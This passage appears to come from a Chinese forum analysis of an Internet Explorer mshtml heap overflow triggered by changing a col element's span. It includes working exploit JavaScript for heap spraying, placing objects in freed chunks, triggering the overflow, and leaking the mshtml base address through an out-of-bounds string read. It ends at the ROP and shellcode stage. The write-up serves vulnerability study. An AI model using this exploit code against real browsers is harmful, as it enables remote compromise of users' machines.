
## 第一部分用以申请大量内存并填充字符内容进行堆布局

```html
<script language='javascript'>
var leak_index = -1;
var dap = "EEEE";
while (dap.length < 480) dap += dap;
var padding = "AAAA";
while (padding.length < 480) padding += padding;
var filler = "BBBB";
while (filler.length < 480) filler += filler;
//spray
var arr = new Array();
var rra = new Array();

var div_container = document.getElementById("test");
div_container.style.cssText = "display:none";

for (var i=0; i < 500; i+=2) {
// E
rra[i] = dap.substring(0, (0x100-6)/2);
// S, bstr = A
arr[i] = padding.substring(0, (0x100-6)/2);
// A, bstr = B
arr[i+1] = filler.substring(0, (0x100-6)/2);
// B
var obj = document.createElement("button");
div_container.appendChild(obj);
}
for (var i=200; i<500; i+=2) {
rra[i] = null;
CollectGarbage();
}
</script>
```

其于内存中分布情况(`BSTR 'E'` & `BSTR 'A'` & `BSTR 'B'` & `CButtonLayout`)：

![](https://bbs.kanxue.com/upload/attach/202102/817966_YZKTNGYPYVJPQCH.jpg)

调用`CollectGarbage()`回收完成后，其`Len`部分变为`0x0000ffff`：

![](https://bbs.kanxue.com/upload/attach/202102/817966_SKJXEDEB664BJJY.jpg)

## 第二部分创建大量`col`标签，以占位之前释放堆块

```html
<table style="table-layout:fixed"><col id="0" width="41" span="9">&nbsp </col></table>
<table style="table-layout:fixed"><col id="1" width="41" span="9">&nbsp </col></table>
...
<table style="table-layout:fixed"><col id="132" width="41" span="9">&nbsp </col></table>
```

之后通过

```javascript
var obj_col = document.getElementById("132");
obj_col.span = 19;
```

完成第一次溢出(可通过条件断点`bp 638209A2 ".if(eax==0x13){};.else{gc;}"`断下后再进一步分析)：

![](https://bbs.kanxue.com/upload/attach/202102/817966_3VQP9HR39A6EZM3.jpg)

而写入位置在每次写入过后会加`0x1C`：

![](https://bbs.kanxue.com/upload/attach/202102/817966_TV2TAHC8PSY3ESQ.jpg)

`0x1C`*`0x12`=`0x1F8`(`0x6368CD4B`处是`jl`命令)，`[EBX+9Ch]+0x1F8+0x18`位置恰为`BSTR 'B'`长度：

![](https://bbs.kanxue.com/upload/attach/202102/817966_5ZASDCQE3W3XA2C.jpg)

之后遍历`arr`数组，长度大于`(0x100-6)/2`元素即为发生溢出位置：

```javascript
for ( var i = 0; i < 500; i++ ) {
if ( arr[i].length > (0x100-6)/2 ) {
// overflowed
leak_index = i;
```

由于该元素长度已被更改为`0x10048`，那么可以越界读取其后`CButtonLayout`中内容：

```javascript
var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2);
// 0xAE086377——금捷(Unicode)
```

![](https://bbs.kanxue.com/upload/attach/202102/817966_QMBU9PUQ4V6QSTR.jpg)

转换成十六进制数，减去`CButtonLayout::vftable`相较于基址偏移便得到基址：

```javascript
leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 );
mshtmlbase = leak_addr - Number(0x001582b8);
```

Exp中偏移与笔者环境中所计算偏移不符：

![](https://bbs.kanxue.com/upload/attach/202102/817966_5RNGBQG6E5WYV4Z.jpg)

构造ROP+Shellcode及进行Heap Spray：
